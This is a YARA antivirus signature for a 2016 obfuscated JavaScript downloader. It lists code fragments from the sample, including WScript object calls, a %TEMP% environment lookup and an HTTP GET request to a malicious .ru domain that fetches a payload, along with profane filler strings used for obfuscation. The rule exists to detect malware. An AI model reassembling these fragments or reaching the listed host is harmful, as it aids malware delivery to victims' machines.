rule sig_20160428_a31d131370c356d02d59d31431b4f791 {
  meta:
    description = "datamaliciousorder - file 20160428_a31d131370c356d02d59d31431b4f791.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9e4eaf5827b2618b37e0fb52357d4c947cb02b2450db46646622719e540d4c30"

  strings:
    $s1  = "function GcbBddWhvIfuKnuCnaIdr(VucEhmFahNohIjaKwnNdp){TsaMtbNgqLoiNllYdrFpn[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function GcbBddWhvIfuKnuCnaIdr(VucEhmFahNohIjaKwnNdp){TsaMtbNgqLoiNllYdrFpn[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function SogKjzZkcRyaWfmDfoOqi() {return TsaMtbNgqLoiNllYdrFpn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "return VsbSvnGwhJrgNavLfrPrb - RhxYuzLasXaeQmtZeoHtt;};" fullword ascii
    $s5  = "function HrbDppYrhSkqBrgGbqTdm(VsbSvnGwhJrgNavLfrPrb, RhxYuzLasXaeQmtZeoHtt){VoiBppFobBclPudXdzVhp = VoiBppFobBclPudXdzVhp * 1; " ascii
    $s6  = "var TsaMtbNgqLoiNllYdrFpn = function BnzKmmOcnCxcJgjWmdZop() {return OzyUkbBstNwjCunVxgBmr[VdtFqiMehImtMnzAboFum](\"WScript\"+\"" ascii
    $s7  = "SkyTsiRuuYpcPnwPatRpa[UjfKkbDavYqhAiyYfkFgo](\"G\" + \"ET\", \"http://sarsudexpert.ru/q2ikcxz\", false);" fullword ascii
    $s8  = "var OzyUkbBstNwjCunVxgBmr = this[\"WScript\"];" fullword ascii
    $s9  = "var TsaMtbNgqLoiNllYdrFpn = function BnzKmmOcnCxcJgjWmdZop() {return OzyUkbBstNwjCunVxgBmr[VdtFqiMehImtMnzAboFum](\"WScript\"+\"" ascii
    $s10 = "function SogKjzZkcRyaWfmDfoOqi() {return TsaMtbNgqLoiNllYdrFpn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function QbiYyjDzyLeqNuqXocLxc(){return NwaZrwZvfQafGhhUauOxy + \"\";};" fullword ascii
    $s12 = "if (SkyTsiRuuYpcPnwPatRpa[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function HrbDppYrhSkqBrgGbqTdm(VsbSvnGwhJrgNavLfrPrb, RhxYuzLasXaeQmtZeoHtt){VoiBppFobBclPudXdzVhp = VoiBppFobBclPudXdzVhp * 1; " ascii
    $s14 = "function FlhCkdEpmSmfBxoAluGik() {return ((IlqMplOihEdmRsdYieBfw == true) && (IlqMplOihEdmRsdYieBfw == EazGtfSbcIqdYplOqoEmg)) ?" ascii
    $s15 = "function FlhCkdEpmSmfBxoAluGik() {return ((IlqMplOihEdmRsdYieBfw == true) && (IlqMplOihEdmRsdYieBfw == EazGtfSbcIqdYplOqoEmg)) ?" ascii
    $s16 = "var CbhApxEagZxcUgcDnsPpx = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "return HrbDppYrhSkqBrgGbqTdm(1 == 1 ? JbjGnqUukBsfEnuLyaNfq : 0, 1 == 1 ? FpcFsuJbgHyaRfnVmhDvf : 0);" fullword ascii
    $s18 = "var EazGtfSbcIqdYplOqoEmg = false;" fullword ascii
    $s19 = "IlqMplOihEdmRsdYieBfw = true; " fullword ascii
    $s20 = "function ZkqPwuBrfGrrZtfAkbOte(){return VdtFqiMehImtMnzAboFum;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}